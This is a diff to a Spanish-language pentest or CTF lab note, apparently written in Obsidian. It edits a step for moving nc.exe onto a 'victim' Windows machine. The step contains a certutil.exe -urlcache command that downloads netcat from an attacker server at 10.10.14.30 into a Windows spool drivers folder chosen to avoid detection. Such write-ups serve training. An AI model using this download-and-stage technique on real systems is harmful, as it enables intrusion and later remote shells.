@@ -333,9 +333,11 @@ usando el binario de `nc.exe` vamos a usarlo para subirlo a la maquina victima u
 ![[Pasted image 20240520172126.png]]
 
 `Certutil.exe`
-usando este comando con certutil podemos realizar un llamado a nuestro servidor para poder subir el archivo a la maquina win
-![[Pasted image 20240520172934.png]]
+usando este comando con certutil podemos realizar un llamado a nuestro servidor para poder subir el archivo a la maquina y guardarlo en una ruta que no nos genere problemas
+
 ```python
 system("certutil.exe -f -urlcache -split http://10.10.14.30/nc.exe C:\\Windows\\System32\\spool\\drivers\\color\\nc.exe");
-
 ```
+
+![[Pasted image 20240520172934.png]]
+
